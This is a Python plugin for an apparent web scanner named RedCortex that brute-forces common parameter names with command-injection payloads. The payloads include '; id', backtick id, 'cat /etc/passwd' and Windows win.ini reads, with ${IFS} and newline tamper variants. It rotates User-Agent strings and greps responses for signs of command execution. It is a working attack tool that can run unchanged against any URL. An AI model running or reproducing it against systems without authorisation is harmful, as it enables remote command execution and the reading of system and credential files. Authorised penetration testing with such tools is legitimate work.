"""
RedCortex Plugin: Advanced RCE Detection

Brute param approach, multiple payloads, encoding/tamper variants, detects command execution in output.
"""

import requests, random, re

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]

RCE_PARAMS = [
    "cmd", "exec", "command", "run", "query", "process", "function", "shell", "ping", "url", "host", "ip"
]

RCE_PAYLOADS = [
    "id",
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "echo GOLDMINE123",
    "type C:\\Windows\\win.ini",
    "ls /",
    "; id",
    "| id",
    "`id`",
    "|| whoami",
    "\";id;\"",
    "'|id'",
    "||echo GOLDMINE456"
]

TAMPERS = [
    lambda x: x,
    lambda x: x + "%0a",
    lambda x: x.replace("id", "whoami"),
    lambda x: x.replace("id", "id;echo8888"),
    lambda x: x.replace(" ", "${IFS}"),
    lambda x: x.replace("id", "`id`"),
    lambda x: x.replace("id", "id\\;"),
]

RCE_PATTERNS = [
    r"uid=\d+",           # POSIX id output
    r"gid=\d+",
    r"GOLDMINE123",       # proof echo
    r"GOLDMINE456",
    r"root:.*:0:0:",      # /etc/passwd output
    r"Microsoft Windows", # Win ini/OS output
    r"\[extensions\]",    # win.ini
    r"Linux",             # uname -a
    r"Darwin",            # macOS uname
    r"No such file or directory", # typical error
]

def send_req(url, params):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        resp = requests.get(url, params=params, headers=headers, timeout=11)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

def run(response, url):
    """RedCortex plugin interface; brute RCE param/payload/tamper, checks for command exec output."""
    findings = []
    params = {}

    try:
        for param_name in RCE_PARAMS:
            for tamper in TAMPERS:
                for payload in RCE_PAYLOADS:
                    try:
                        fuzzed = tamper(payload)
                        params[param_name] = fuzzed
                        print(f"[*] Testing RCE on param '{param_name}' with tamper '{tamper.__name__ if hasattr(tamper,'__name__') else str(tamper)}' and payload '{payload}'")
                        sc, body = send_req(url, params)
                        if sc == 200:
                            for pattern in RCE_PATTERNS:
                                if re.search(pattern, body, re.IGNORECASE):
                                    findings.append({
                                        "type": "RCE",
                                        "description": f"RCE detected via {param_name}, payload '{fuzzed}', evidence '{pattern}'",
                                        "param": param_name,
                                        "payload": fuzzed,
                                        "original_payload": payload,
                                        "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                        "severity": "critical",
                                        "url": url,
                                        "evidence": re.findall(pattern, body, re.IGNORECASE)
                                    })
                                    return findings
                            # Also detect "id"/"whoami" presence (less strict)
                            if "uid=" in body or "whoami" in body or "root:" in body or "Linux" in body:
                                findings.append({
                                    "type": "RCE",
                                    "description": f"Possible RCE, raw output leak via {param_name} ({tamper})",
                                    "param": param_name,
                                    "payload": fuzzed,
                                    "original_payload": payload,
                                    "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                    "severity": "high",
                                    "url": url,
                                    "evidence": fuzzed
                                })
                                return findings
                    except KeyboardInterrupt:
                        print("[!] Scan interrupted by user.")
                        return findings
    except KeyboardInterrupt:
        print("[!] Scan interrupted by user.")
        return findings

    return findings
